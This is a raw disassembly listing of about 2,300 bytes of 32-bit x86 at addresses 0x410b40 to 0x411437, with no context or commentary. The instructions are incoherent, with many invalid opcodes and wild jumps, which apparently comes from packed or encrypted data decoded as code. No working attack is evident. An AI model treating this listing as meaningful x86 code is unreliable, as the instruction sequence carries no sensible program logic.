  410b40:	add    BYTE PTR [ebx-0x7a72f6a1],al
  410b46:	push   ecx
  410b47:	stos   DWORD PTR es:[edi],eax
  410b48:	std    
  410b49:	jmp    ebx
  410b4b:	stos   DWORD PTR es:[edi],eax
  410b4c:	mov    bl,0xa4
  410b4e:	test   DWORD PTR [ebp+edi*8-0x1069318],ebp
  410b55:	dec    DWORD PTR [edx-0x7b015d2e]
  410b5b:	lods   al,BYTE PTR ds:[esi]
  410b5c:	inc    esp
  410b5d:	and    DWORD PTR [ebp+0x54],0x70
  410b61:	les    edx,FWORD PTR [edi+edi*2-0xe]
  410b65:	inc    BYTE PTR [ebp+ebp*4-0x1a]
  410b69:	mov    ah,0x1
  410b6b:	scas   al,BYTE PTR es:[edi]
  410b6c:	std    
  410b6d:	(bad)  
  410b6e:	pop    esi
  410b6f:	ins    BYTE PTR es:[edi],dx
  410b70:	cld    
  410b71:	push   DWORD PTR [esp+eax*1]
  410b74:	add    BYTE PTR [eax],al
  410b76:	shl    DWORD PTR [edx+0x0],cl
  410b79:	lea    ecx,[esi+0x6c]
  410b7c:	cld    
  410b7d:	jmp    esp
  410b7f:	xchg   ebx,eax
  410b80:	std    
  410b81:	mov    ch,0xf
  410b83:	scas   al,BYTE PTR es:[edi]
  410b84:	std    
  410b85:	dec    DWORD PTR [ebx]
  410b87:	dec    esi
  410b88:	das    
  410b89:	(bad)  
  410b8a:	cli    
  410b8b:	test   BYTE PTR [ebx],0xc0
  410b8e:	add    eax,0x8dff5aea
  410b93:	pop    esi
  410b94:	cmp    DWORD PTR [edx+eax*2+0x2ffe5650],0x274
	...
  410baf:	add    BYTE PTR ds:0x6dff6ae9,al
  410bb5:	pop    esi
  410bb6:	xchg   DWORD PTR [ecx+eiz*2-0x3501a9d0],eax
  410bbd:	(bad)  
  410bc0:	cli    
  410bc1:	pop    ebp
  410bc2:	push   0xffffffe3
  410bc4:	add    ebx,DWORD PTR [esi+0x2]
  410bc7:	or     edi,DWORD PTR [edx]
  410bc9:	pop    edi
  410bca:	jle    0x410b9a
  410bcc:	cli    
  410bcd:	pop    ebp
  410bce:	add    bh,BYTE PTR ds:0x25cfe
  410bd4:	std    
  410bd5:	fidivr WORD PTR [edi]
  410bd7:	jmp    DWORD PTR ds:0xf04f6a5e
  410bdd:	pop    ebp
  410bde:	add    dl,BYTE PTR [eax-0x5e]
  410be1:	aaa    
  410be2:	leave  
  410be3:	inc    eax
  410be4:	cli    
  410be5:	fadd   DWORD PTR [eax+0x56cf04c1]
  410beb:	dec    edi
  410bec:	adc    al,dl
  410bee:	or     DWORD PTR [eax],eax
  410bf0:	cli    
  410bf1:	fidivr DWORD PTR [edi]
  410bf3:	or     esp,DWORD PTR [eax+0x5e]
  410bf6:	xchg   DWORD PTR [ecx+eiz*8+0x4afe56af],eax
  410bfd:	(bad)  
  410bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bff:	or     dl,bh
  410c01:	pop    ebp
  410c02:	xchg   DWORD PTR [ecx+edx*8+0x2afe56c7],eax
  410c09:	mov    dh,0x13
  410c0b:	inc    ebx
  410c0c:	mov    ebp,0x2fc00b16
  410c11:	(bad)  
  410c12:	jmp    0x410bc3
	...
  410c24:	add    BYTE PTR [eax],al
  410c26:	loop   0x410c2c
  410c28:	test   al,0x3
  410c2a:	ja     0x410bb5
  410c2c:	and    DWORD PTR [esi-0x64],edx
  410c2f:	dec    edi
  410c30:	mov    eax,0xe0bc26b
  410c35:	push   edi
  410c36:	jle    0x410cb1
  410c38:	sub    dl,BYTE PTR [esi-0x7c]
  410c3b:	dec    edi
  410c3c:	call   0x7456:0xb4f495b3
  410c43:	pop    ebx
  410c44:	(bad)  [eax+0x56e64276]
  410c4a:	fs mov ah,0x6b
  410c4d:	and    BYTE PTR [eax+0x4e],0xd5
  410c51:	push   esi
  410c52:	lds    ebx,FWORD PTR [ebp+eax*4+0x1a]
  410c56:	dec    ebp
  410c57:	dec    edi
  410c58:	outs   dx,DWORD PTR ds:[esi]
  410c59:	add    BYTE PTR [ecx+0x3c56bd4e],0x99
  410c60:	je     0x410cb7
  410c62:	xor    al,0x4f
  410c64:	lods   eax,DWORD PTR ds:[esi]
  410c65:	nop
  410c66:	sub    DWORD PTR [esi-0x5b],ecx
  410c69:	push   esi
  410c6a:	sbb    eax,0x1c56d9d8
  410c6f:	sti    
  410c70:	test   al,0xcf
  410c72:	enter  0x2adc,0xcb
  410c76:	mov    edx,0xfd5e9104
  410c7b:	add    al,0xe9
  410c7d:	mov    bl,0x95
  410c7f:	ret    0xc521
  410c82:	cmc    
  410c83:	dec    edi
  410c84:	xor    ebx,DWORD PTR [edi+0x6b654eef]
	...
  410c9a:	add    BYTE PTR [eax],al
  410c9c:	in     al,dx
  410c9d:	ret    0x565d
  410ca0:	push   ebx
  410ca1:	add    al,0xc3
  410ca3:	add    esp,DWORD PTR [eax+0x5]
  410ca6:	dec    esi
  410ca7:	nop
  410ca8:	xchg   ecx,eax
  410ca9:	dec    edi
  410caa:	inc    ebp
  410cab:	push   esi
  410cac:	pop    ebp
  410cad:	or     edx,DWORD PTR [eax]
  410caf:	lds    edi,FWORD PTR [ebp+0x21e8ffdc]
  410cb5:	ret    0xe909
  410cb8:	stc    
  410cb9:	dec    ebp
  410cba:	mov    ah,0x65
  410cbc:	dec    edi
  410cbd:	dec    edi
  410cbe:	(bad)  
  410cbf:	adc    DWORD PTR [edi+edx*1-0x1],edx
  410cc3:	push   ss
  410cc4:	sub    al,0x99
  410cc6:	mov    ds:0xe74f240f,eax
  410ccb:	dec    ebp
  410ccc:	hlt    
  410ccd:	dec    ebp
  410cce:	(bad)  
  410ccf:	(bad)  
  410cd0:	ins    DWORD PTR es:[edi],dx
  410cd1:	push   edx
  410cd2:	std    
  410cd3:	test   bh,0x65
  410cd6:	add    eax,0xfb4ec4be
  410cdb:	sbb    bh,BYTE PTR [esi-0x38210174]
  410ce1:	dec    esi
  410ce2:	icebp  
  410ce3:	xchg   esi,esi
  410ce5:	add    eax,0x4efd640f
  410cea:	inc    dh
  410cec:	mov    WORD PTR [edi+0x7b8daac8],gs
  410cf2:	jmp    0x410d5e
  410cf4:	mov    edx,0x98ec675d
  410cf9:	or     eax,0x548a100
  410cfe:	ret    
  410cff:	sahf   
	...
  410d10:	add    BYTE PTR [eax],al
  410d12:	jae    0x410d48
  410d14:	addr16 in al,dx
  410d16:	clc    
  410d17:	add    al,0x0
  410d19:	and    DWORD PTR [edi+edx*1],0x347386ff
  410d20:	mov    BYTE PTR [edx+eiz*4],ah
  410d23:	jp     0x410cf6
  410d25:	add    ebp,esi
  410d27:	add    al,0x0
  410d29:	jmp    0x6677ee8f
  410d2e:	dec    edi
  410d2f:	jnp    0x410d02
  410d31:	jo     0x410cd0
  410d33:	pop    ebp
  410d34:	addr16 in al,dx
  410d36:	clc    
  410d37:	add    al,0x0
  410d39:	inc    ecx
  410d3a:	test   BYTE PTR [esi],dl
  410d3c:	inc    DWORD PTR [eax]
  410d3e:	cmp    al,0x7c
  410d40:	ror    BYTE PTR [ebx-0x7bc861f],1
  410d46:	sbb    BYTE PTR [ebx],dl
  410d48:	mov    dl,dl
  410d4a:	mov    ebx,0x93ffff4d
  410d4f:	mov    eax,0x189fc73
  410d54:	call   0x42a774
  410d59:	mov    edx,ecx
  410d5b:	jnp    0x410d2d
  410d5d:	inc    DWORD PTR [esi]
  410d5f:	mov    dl,0x66
  410d61:	add    al,0x92
  410d63:	add    DWORD PTR [eax],eax
  410d65:	call   0x410753
  410d6a:	pop    eax
  410d6b:	shl    DWORD PTR [edx+0xf],0xe8
  410d6f:	adc    esp,DWORD PTR [edi+0x47]
  410d72:	sub    BYTE PTR [edx-0x2],al
  410d75:	inc    BYTE PTR [eax]
	...
  410d87:	add    BYTE PTR [esi+0x5b31e6b8],dh
  410d8d:	add    DWORD PTR [eax],eax
  410d8f:	mov    esp,DWORD PTR [ecx+0x5b]
  410d92:	(bad)  
  410d93:	imul   edx,DWORD PTR [ebx+0x5b],0x5b236a00
  410d9a:	add    DWORD PTR [eax+0x23],ebp
  410d9d:	add    DWORD PTR [eax],eax
  410d9f:	rcr    BYTE PTR [esi+edi*1-0x12],0xe8
  410da4:	pop    edi
  410da5:	push   eax
  410da6:	(bad)  
  410da7:	call   FWORD PTR [edx+0x1840f28e]
  410dad:	shl    DWORD PTR [ebx+0x44],0x7c
  410db1:	ds cli 
  410db3:	inc    DWORD PTR [esi]
  410db5:	mov    cl,0xe6
  410db7:	jmp    esp
  410db9:	or     BYTE PTR [eax],al
  410dbb:	push   0xffffffff
  410dbd:	pop    esi
  410dbe:	(bad)  
  410dbf:	inc    dh
  410dc1:	mov    eax,0x8ea73e6
  410dc6:	add    BYTE PTR [ebx],cl
  410dc8:	cli    
  410dc9:	sbb    eax,0x463a0bcf
  410dce:	mov    ebx,0xb25e3b4a
  410dd3:	out    0xd9,eax
  410dd5:	arpl   WORD PTR [edx],ax
  410dd7:	add    BYTE PTR [eax],ah
  410dd9:	pop    esi
  410dda:	call   0xe8a131de
  410ddf:	call   DWORD PTR [ebx]
  410de1:	pop    edi
  410de2:	jmp    0xffe:0x425e9dff
  410de9:	out    dx,al
  410dea:	push   0xffffff95
	...
  410dfc:	add    BYTE PTR [eax],al
  410dfe:	cmc    
  410dff:	pop    ebp
  410e00:	add    cl,BYTE PTR [ecx+0x73c14a3f]
  410e06:	adc    DWORD PTR [esi-0x3d],esi
  410e09:	dec    edx
  410e0a:	mov    ebx,0xf59d6a5d
  410e0f:	pop    ebp
  410e10:	add    dl,BYTE PTR [eax-0x2e]
  410e13:	adc    bh,BYTE PTR [edi-0x27d505c0]
  410e19:	repz bound esp,QWORD PTR [esp+edx*1+0x530e4dff]
  410e21:	je     0x410e71
  410e23:	ss into 
  410e25:	push   es
  410e26:	cli    
  410e27:	pop    ebp
  410e28:	stos   BYTE PTR es:[edi],al
  410e29:	or     bh,BYTE PTR [edx]
  410e2b:	or     DWORD PTR [esi],eax
  410e2d:	jmp    0x410de8
  410e2f:	call   0x40be:0xca92fbd8
  410e36:	cli    
  410e37:	push   0xffffffd8
  410e39:	mul    DWORD PTR [edx]
  410e3b:	stos   BYTE PTR es:[edi],al
  410e3c:	sti    
  410e3d:	dec    DWORD PTR ds:0x920b47df
  410e43:	or     al,0xbf
  410e45:	inc    eax
  410e46:	cli    
  410e47:	jne    0x410ddd
  410e49:	push   es
  410e4a:	cli    
  410e4b:	pop    ebp
  410e4c:	std    
  410e4d:	mov    edi,0xa2da4066
  410e52:	xor    DWORD PTR ds:0x5d4a03a8,eax
  410e58:	nop
  410e59:	or     edi,edx
  410e5b:	add    al,0xe2
  410e5d:	inc    ebx
  410e5e:	dec    ecx
  410e5f:	clc    
  410e60:	ret    0x3
	...
  410e73:	add    BYTE PTR [eax+0x5],dl
  410e76:	inc    esi
  410e77:	fld    st(5)
  410e79:	dec    ebx
  410e7a:	mov    bl,0x53
  410e7c:	sbb    eax,0xadc5000f
  410e81:	fucomp st(0)
  410e83:	push   edx
  410e84:	mov    ch,0x4b
  410e86:	fwait
  410e87:	dec    edi
  410e88:	xchg   ebp,eax
  410e89:	adc    eax,0x4b9452d7
  410e8e:	fwait
  410e8f:	push   ebx
  410e90:	xchg   ebp,eax
  410e91:	sbb    eax,0x4b8452d7
  410e96:	jnp    0x410ee3
  410e98:	xchg   ebp,eax
  410e99:	and    eax,0x3d7452b7
  410e9e:	sub    DWORD PTR [ebx+0x664bdcc8],edi
  410ea4:	and    eax,0xfad5e105
  410ea9:	inc    edi
  410eaa:	fisttp QWORD PTR [esi+0x3e904fa]
  410eb0:	lea    esi,[ebx]
  410eb2:	and    ebp,eax
  410eb4:	inc    ebp
  410eb5:	fucom  st(7)
  410eb7:	mov    edx,0x53249555
  410ebc:	xor    al,0x27
  410ebe:	xchg   ecx,eax
  410ebf:	dec    edi
  410ec0:	call   0x24937e09
  410ec5:	dec    ebx
  410ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec7:	push   ebp
  410ec8:	dec    edi
  410ec9:	or     al,0xe6
  410ecb:	fcomp  DWORD PTR ds:0xacaea97f
  410ed1:	inc    edi
  410ed2:	xor    edi,DWORD PTR [edi+0x11]
  410ed5:	xchg   DWORD PTR [ebx+edx*2+0x0],ebp
	...
  410ee8:	add    BYTE PTR [eax],al
  410eea:	test   al,0xdc
  410eec:	xchg   ebx,eax
  410eed:	gs xor eax,0xc7710005
  410ef3:	add    eax,0x97c6ec3
  410ef8:	leave  
  410ef9:	pop    ss
  410efa:	mov    bh,0x4a
  410efc:	(bad)  
  410efd:	aad    0xcf
  410eff:	xchg   DWORD PTR [eax+edi*1],edi
  410f02:	sbb    eax,esp
  410f04:	(bad)  
  410f05:	call   0x4c40cb7
  410f0a:	add    ebx,DWORD PTR [eax]
  410f0c:	inc    ecx
  410f0d:	jmp    0x245df0b
  410f12:	ss scas eax,DWORD PTR es:[edi]
  410f14:	enter  0x42a,0x2e
  410f18:	out    0xcd,eax
  410f1a:	lock add al,0x0
  410f1d:	ins    BYTE PTR es:[edi],dx
  410f1e:	push   edx
  410f1f:	dec    esi
  410f20:	push   ecx
  410f21:	adc    DWORD PTR [ecx-0x390b0146],0x17
  410f28:	inc    ecx
  410f29:	jmp    0x654f99aa
  410f2e:	jmp    0xc12b0d7c
  410f33:	shl    bh,0xe9
  410f36:	stc    
  410f37:	add    al,0x0
  410f39:	je     0x410f70
  410f3b:	push   edx
  410f3c:	dec    edi
  410f3d:	push   ebx
  410f3e:	(bad)  
  410f3f:	fdivp  st(7),st
  410f41:	inc    edx
  410f42:	stc    
  410f43:	dec    ecx
  410f44:	je     0x410f13
  410f46:	stos   DWORD PTR es:[edi],eax
  410f47:	lock rcl BYTE PTR [edi],1
  410f4a:	cmp    DWORD PTR [edx+0x9],ecx
  410f4d:	test   eax,0x0
	...
  410f5e:	add    BYTE PTR [eax],al
  410f60:	dec    ebp
  410f61:	fsubr  st(7),st
  410f63:	cmp    DWORD PTR [ebx],eax
  410f65:	add    eax,0xcbb66a00
  410f6a:	je     0x410f75
  410f6c:	ja     0x410f37
  410f6e:	imul   ecx
  410f70:	sub    eax,0xbe1cfeac
  410f75:	popa   
  410f76:	jg     0x410f4c
  410f78:	stos   BYTE PTR es:[edi],al
  410f79:	dec    edx
  410f7a:	mov    BYTE PTR [eax],al
  410f7c:	into   
  410f7d:	lods   al,BYTE PTR ds:[esi]
  410f7e:	mov    eax,DWORD PTR [ebp+0x7b]
  410f81:	nop
  410f82:	std    
  410f83:	jne    0x410ff0
  410f85:	mov    ah,0x73
  410f87:	hlt    
  410f88:	stc    
  410f89:	add    eax,0xb45775ff
  410f8e:	adc    edx,ecx
  410f90:	add    eax,0x230afe46
  410f95:	sub    eax,0xb19e8b2c
  410f9a:	mov    DWORD PTR [eax],edx
  410f9c:	inc    esi
  410f9d:	inc    edx
  410f9e:	out    dx,al
  410f9f:	push   eax
  410fa0:	xchg   ecx,eax
  410fa1:	mov    ah,0x13
  410fa3:	aad    0xf5
  410fa5:	inc    ebp
  410fa6:	dec    BYTE PTR [edx]
  410fa8:	shr    DWORD PTR [eax+ebx*1],cl
  410fab:	push   0x3f87e9
  410fb0:	hlt    
  410fb1:	xor    esi,ebp
  410fb3:	call   0x410eb1
  410fb8:	cwde   
  410fb9:	lds    esi,FWORD PTR [ebx+0x1]
  410fbc:	push   eax
  410fbd:	mov    ah,0x73
  410fbf:	lock or esi,edx
  410fc2:	add    eax,0x0
	...
  410fd3:	add    BYTE PTR [eax],al
  410fd5:	add    BYTE PTR [ebx-0x4c],ah
  410fd8:	jae    0x410fce
  410fda:	sti    
  410fdb:	dec    ebx
  410fdc:	xor    edi,edi
  410fde:	push   esp
  410fdf:	mov    ah,0x73
  410fe1:	cld    
  410fe2:	sub    edi,esp
  410fe4:	add    eax,0xc1c86300
  410fe9:	pop    ebx
  410fea:	call   0xc286:0x278b53c0
  410ff1:	shl    BYTE PTR [ebp-0x4c],0xfd
  410ff5:	push   ebx
  410ff6:	mov    ebx,0x1340e17a
  410ffb:	mov    ebp,0xb4500170
  411000:	cmp    DWORD PTR ds:0x40ed59,0x1ad65bfa
  41100a:	jns    0x411044
  41100c:	push   eax
  41100d:	daa    
  41100e:	mov    ebx,0x874025b
  411013:	fisttp DWORD PTR ds:0x41d1cc9
  411019:	add    BYTE PTR [esi+0x65],ch
  41101c:	cmp    DWORD PTR [edi+ebp*4],0xfffffff0
  411020:	ret    0xd5ff
  411023:	xor    DWORD PTR ds:0x3993ba2b,eax
  411029:	ret    0x1311
  41102c:	push   eax
  41102d:	adc    al,0xc0
  41102f:	test   dl,0xff
  411032:	and    BYTE PTR [ecx+0x2277c656],0x51
  411039:	inc    BYTE PTR [eax]
	...
  41104b:	add    BYTE PTR [ebp-0x5fffcfa],ah
  411051:	jae    0x411055
  411053:	push   0xfffffff8
  411055:	cmc    
  411056:	cdq    
  411057:	add    eax,0xf7835dfa
  41105c:	test   DWORD PTR [edi],esp
  41105e:	xchg   BYTE PTR ds:0x89025dfb,bl
  411064:	jg     0x41107c
  411066:	push   ecx
  411067:	(bad)  
  411068:	ins    DWORD PTR es:[edi],dx
  411069:	loope  0x410ff0
  41106b:	retf   
  41106c:	fs push edi
  41106e:	dec    esi
  41106f:	dec    edi
  411070:	pop    ebp
  411071:	imul   edi,DWORD PTR [ebx],0x5b2755fd
  411077:	(bad)  
  411078:	hlt    
  411079:	pop    ebp
  41107a:	add    cl,BYTE PTR [ebx]
  41107c:	cmp    ah,BYTE PTR [edi]
  41107e:	xchg   dl,dh
  411080:	cli    
  411081:	pop    ebp
  411082:	add    ch,BYTE PTR [eax+0x77]
  411085:	adc    eax,ebp
  411087:	(bad)  
  411088:	jle    0x411063
  41108a:	push   ebx
  41108b:	std    
  41108c:	and    eax,0xbe7b397
  411091:	add    eax,0xfbfa03ee
  411096:	test   al,0xff
  411098:	jns    0x4110de
  41109a:	call   0x63810aa2
  41109f:	dec    eax
  4110a0:	inc    DWORD PTR [edi-0x7b]
  4110a3:	add    al,0xfa
  4110a5:	add    al,0xe9
  4110a7:	xor    BYTE PTR [esi+0x40],0x76
  4110ab:	dec    edi
  4110ac:	in     al,0xb4
  4110ae:	ins    DWORD PTR es:[edi],dx
  4110af:	cdq    
	...
  4110c0:	add    BYTE PTR [eax],al
  4110c2:	leave  
  4110c3:	inc    esi
  4110c4:	gs dec edi
  4110c6:	aam    0xf1
  4110c8:	pop    esi
  4110c9:	sbb    al,0x3b
  4110cb:	add    eax,0x46b97962
  4110d0:	dec    ebp
  4110d1:	dec    edi
  4110d2:	lock inc esp
  4110d4:	cmc    
  4110d5:	xchg   DWORD PTR [ebp-0xefc16fc],ecx
  4110db:	mov    cl,0x3c
  4110dd:	(bad)  
  4110de:	jle    0x411157
  4110e0:	call   0x5b890ae8
  4110e5:	cmp    BYTE PTR [edi-0x7225e2b9],dl
  4110eb:	fucomip st,st(0)
  4110ed:	add    edi,edx
  4110ef:	add    al,BYTE PTR [ecx]
  4110f1:	and    esp,esi
  4110f3:	add    al,0xe9
  4110f5:	cli    
  4110f6:	mov    ch,0xd0
  4110f8:	jg     0x411176
  4110fa:	mov    dh,0x4c
  4110fc:	arpl   cx,cx
  4110fe:	popa   
  4110ff:	mov    ah,0x80
  411101:	pop    edx
  411102:	cli    
  411103:	add    ch,cl
  411105:	dec    esi
  411106:	into   
  411107:	dec    esp
  411108:	(bad)  
  41110a:	inc    edx
  41110b:	push   ss
  41110c:	sub    BYTE PTR [ecx+esi*8],al
  41110f:	inc    esp
  411110:	push   esp
  411111:	lods   al,BYTE PTR ds:[esi]
  411112:	cmp    al,0xd1
  411114:	les    ecx,FWORD PTR [esi+0xe]
  411117:	cmp    cl,BYTE PTR [esi]
  411119:	lds    ebp,FWORD PTR ds:0x4da8fffa
  41111f:	or     al,0x43
  411121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411122:	jb     0x4110ab
  411124:	std    
  411125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  411136:	add    BYTE PTR [eax],al
  411138:	les    eax,FWORD PTR [edi-0x2]
  41113b:	jmp    0xa9c58b39
  411140:	mov    bh,0x46
  411142:	(bad)  
  411143:	cmp    DWORD PTR [esi],ebx
  411145:	push   es
  411146:	add    dh,dh
  411148:	stc    
  411149:	pop    esp
  41114a:	pop    esi
  41114b:	out    0xf9,eax
  41114d:	add    al,0xb
  41114f:	test   eax,0x2c82f1c2
  411154:	cmp    DWORD PTR [eax-0x2],ecx
  411157:	data16 stc 
  411159:	ror    BYTE PTR [ebx],1
  41115b:	pop    esi
  41115c:	jb     0x4110e4
  41115e:	std    
  41115f:	push   esi
  411160:	xor    al,0x77
  411162:	add    al,0xe
  411164:	ffreep st(3)
  411166:	call   DWORD PTR [ecx+0x8]
  411169:	pop    edx
  41116a:	sbb    DWORD PTR [esi],edi
  41116c:	ror    BYTE PTR [edx-0x19],cl
  41116f:	jge    0x41116e
  411171:	add    al,0x0
  411173:	cs ret 0xe74e
  411177:	push   ebp
  411178:	std    
  411179:	add    al,0x0
  41117b:	adc    dl,BYTE PTR [ecx+0x21117447]
  411181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411182:	add    ebp,ecx
  411184:	stc    
  411185:	ja     0x41110b
  411187:	xor    eax,0x99fe46c7
  41118c:	mov    esp,0xb7f7c790
  411191:	inc    esi
  411192:	out    0x45,eax
  411194:	repnz add al,0x0
  411197:	sar    ch,1
  411199:	inc    ebp
  41119a:	(bad)  
  41119b:	fiadd  WORD PTR [eax]
	...
  4111ad:	add    BYTE PTR [edi-0x48283870],bh
  4111b3:	inc    esi
  4111b4:	out    0x69,eax
  4111b6:	repnz add al,0x0
  4111b9:	add    BYTE PTR [eax+0x60c959c3],ch
  4111bf:	mov    cs,WORD PTR [ecx-0x21436f14]
  4111c5:	push   ebx
  4111c6:	mov    ebx,0x2340e4f6
  4111cb:	mov    edx,0xb8600170
  4111d0:	cmp    DWORD PTR ds:0x40e68a,0x83072e13
  4111da:	mov    esi,0xe3412cce
  4111df:	add    DWORD PTR [ebp+0x5],esi
  4111e2:	mov    eax,0x90c959c1
  4111e7:	mov    edi,0x1e3fc43
  4111ec:	add    BYTE PTR [eax],al
  4111ee:	adc    al,0x3e
  4111f0:	test   BYTE PTR [eax],0xd3
  4111f3:	add    DWORD PTR [eax],eax
  4111f5:	(bad)  
  4111f6:	xchg   esi,eax
  4111f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111f8:	(bad)  
  4111f9:	jmp    DWORD PTR [ebx-0x18ba38ff]
  4111ff:	add    BYTE PTR [eax],al
  411201:	add    BYTE PTR [ebx-0x6c0fbc40],dl
  411207:	add    DWORD PTR [eax],eax
  411209:	add    BYTE PTR [esi],cl
  41120b:	ds out dx,al
  41120d:	push   eax
  41120e:	push   ds
  41120f:	ds repnz push eax
	...
  411222:	add    BYTE PTR [eax],al
  411224:	push   ds
  411225:	ds jmp 0xff45:0x8bb87950
  41122d:	nop
  41122e:	push   0x6a048902
  411233:	add    BYTE PTR [esi+ecx*2-0x69],ch
  411237:	cs xchg edx,eax
  411239:	add    DWORD PTR [ecx+0x7b842b45],ecx
  41123f:	call   0x81483fa7
  411244:	cli    
  411245:	mov    al,0x5b
  411247:	jmp    0x75436e46
  41124c:	scas   al,BYTE PTR es:[edi]
  41124d:	ds aad 0xfb
  411250:	jge    0x411272
  411252:	dec    esp
  411253:	and    BYTE PTR [edi-0x3f8bfd6d],0xe2
  41125a:	lods   eax,DWORD PTR ds:[esi]
  41125b:	mul    DWORD PTR [ecx]
  41125d:	pop    esi
  41125e:	dec    ebx
  41125f:	jb     0x411203
  411261:	jae    0x411238
  411263:	inc    ecx
  411264:	add    eax,0x1a44796e
  411269:	jbe    0x41127a
  41126b:	call   0xfe8e02d1
  411270:	add    DWORD PTR [esi-0x2a],ebp
  411273:	and    dh,BYTE PTR [ebx-0xf]
  411276:	addr16 imul ebp,esi,0xd5315c85
  41127d:	stos   DWORD PTR es:[edi],eax
  41127e:	dec    ebx
  41127f:	je     0x41125b
  411281:	mov    bl,0xc2
  411283:	pop    es
  411284:	lds    esp,FWORD PTR [ecx+0x66]
  411287:	mov    es,WORD PTR [eax]
	...
  411299:	add    BYTE PTR [edx],bh
  41129b:	sub    cl,BYTE PTR [ebx+0x34]
  41129e:	or     esi,DWORD PTR [edi-0x3f]
  4112a1:	(bad)  
  4112a2:	jl     0x4112d2
  4112a4:	lahf   
  4112a5:	adc    BYTE PTR [ecx],dh
  4112a7:	ins    DWORD PTR es:[edi],dx
  4112a8:	add    al,BYTE PTR [ebx+0x4c4b7ab9]
  4112ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112af:	scas   eax,DWORD PTR es:[edi]
  4112b0:	int    0xeb
  4112b2:	cli    
  4112b3:	cwde   
  4112b4:	xchg   esi,edi
  4112b6:	bndldx bnd1,[esp+edx*1+0x67]
  4112bb:	test   cl,al
  4112bd:	(bad)  
  4112be:	cmp    al,0x71
  4112c0:	dec    esi
  4112c1:	jmp    FWORD PTR [ebp+0x2e]
  4112c4:	add    al,BYTE PTR [ecx-0xa6fa19]
  4112ca:	pop    ebp
  4112cb:	cs aad 0x4
  4112ce:	arpl   WORD PTR ds:0x444c4b45,ax
  4112d4:	imul   ecx,ecx,0xfd5d0541
  4112da:	cmp    al,0xba
  4112dc:	int3   
  4112dd:	dec    ebx
  4112de:	push   cs
  4112df:	call   0x3e7:0x7c2dc516
  4112e6:	cli    
  4112e7:	add    al,0x12
  4112e9:	cmp    eax,0x5861da38
  4112ee:	js     0x411339
  4112f0:	mov    esp,0x23aca4b7
  4112f5:	(bad)  
  4112f6:	lds    eax,FWORD PTR [ecx+edx*4]
  4112f9:	(bad)  
  4112fa:	cli    
  4112fb:	inc    edi
  4112fc:	lea    eax,[edi+0x0]
	...
  41130e:	add    BYTE PTR [eax],al
  411310:	ss push edx
  411312:	(bad)  
  411313:	(bad)  
  411314:	in     eax,dx
  411315:	inc    ebx
  411316:	hlt    
  411317:	cld    
  411318:	js     0x41131b
  41131a:	nop
  41131b:	sbb    bh,BYTE PTR [ebx]
  41131d:	add    eax,0xefffd0e9
  411322:	sub    BYTE PTR [ebx+0x7f294e30],ch
  411328:	out    0x15,al
  41132a:	mov    ds:0x772cbdc4,al
  41132f:	add    eax,0x205104fa
  411334:	scas   al,BYTE PTR es:[edi]
  411335:	inc    ebx
  411336:	cmp    eax,0xa219e687
  41133b:	les    ebx,FWORD PTR [ebp-0x6b0d4bbd]
  411341:	mov    bh,0xec
  411343:	dec    edx
  411344:	(bad)  
  411345:	sbb    DWORD PTR [edx+0x462b85c4],esi
  41134b:	pop    es
  41134c:	cli    
  41134d:	add    al,0xe2
  41134f:	inc    ebx
  411350:	out    dx,al
  411351:	or     DWORD PTR [eax],edx
  411353:	fdivp  st(2),st
  411355:	add    al,0xe9
  411357:	inc    edx
  411358:	mov    esi,0xf9e8ff40
  41135d:	add    al,0x0
  41135f:	pop    esp
  411360:	cmp    edi,DWORD PTR [edi]
  411362:	dec    edi
  411363:	push   ebx
  411364:	imul   BYTE PTR [esi+0x72cde01]
  41136a:	push   0xffffffe9
  41136c:	mov    al,0xb6
  41136e:	add    ecx,esi
  411370:	sub    bl,BYTE PTR [ebp+ebp*1+0x28]
	...
  411384:	add    BYTE PTR [eax],al
  411386:	test   BYTE PTR [edi],0xc0
  411389:	xor    eax,0xe9882dfb
  41138e:	stc    
  41138f:	add    al,0xff
  411391:	cmp    bh,dl
  411393:	sub    al,0x59
  411395:	sub    cl,al
  411397:	inc    edx
  411398:	mov    BYTE PTR [esi+esi*4],ah
  41139b:	inc    edx
  41139c:	jb     0x41138b
  41139e:	mov    eax,ds:0xf9e90131
  4113a3:	aam    0xfe
  4113a5:	cld    
  4113a6:	inc    ecx
  4113a7:	sar    dh,cl
  4113a9:	cli    
  4113aa:	in     eax,0xaa
  4113ac:	jmp    edi
  4113ae:	stc    
  4113af:	add    al,0x68
  4113b1:	jmp    0x523f568b
  4113b6:	pop    edx
  4113b7:	pop    es
  4113b8:	add    cl,ch
  4113ba:	les    eax,FWORD PTR [edx-0x36c6fd8d]
  4113c0:	sti    
  4113c1:	jmp    0x744118bf
  4113c6:	mov    edx,0xf9d34f3e
  4113cb:	scas   al,BYTE PTR es:[edi]
  4113cc:	add    DWORD PTR [esi],esi
  4113ce:	retf   0x693a
  4113d1:	jmp    0x2644cb16
  4113d6:	mov    bl,BYTE PTR [ebp+0x2d]
  4113d9:	test   al,0xf9
  4113db:	or     eax,0x437f9dc0
  4113e0:	je     0x4113f3
  4113e2:	shl    DWORD PTR [edi+0x30],1
  4113e5:	add    ah,dh
  4113e7:	into   
  4113e8:	jmp    0x41141d
	...
  4113f9:	add    BYTE PTR [eax],al
  4113fb:	add    BYTE PTR [edx+edx*2-0xa],ah
  4113ff:	call   0x402ccb
  411404:	and    al,0x6
  411406:	and    BYTE PTR [ecx+0x63],al
  411409:	lds    eax,FWORD PTR [ebx-0x4]
  41140c:	push   ebx
  41140d:	push   es
  41140e:	add    BYTE PTR [eax],al
  411410:	(bad)  
  411411:	cmp    edx,0x6a08b950
  411417:	add    cl,BYTE PTR [ebx+eiz*2]
  41141a:	(bad)  
  41141b:	(bad)  
  41141c:	loopne 0x411422
  41141e:	call   DWORD PTR ds:0x411f8a
  411424:	sbb    dh,al
  411426:	or     eax,0x8aa84
  41142b:	add    BYTE PTR [edx+eax*4-0x2a],bl
  41142f:	and    BYTE PTR [ebx],dl
  411431:	push   es
  411432:	add    bh,al
  411434:	push   ds
  411435:	in     eax,dx
  411436:	(bad)  
  411437:	jmp    ebx
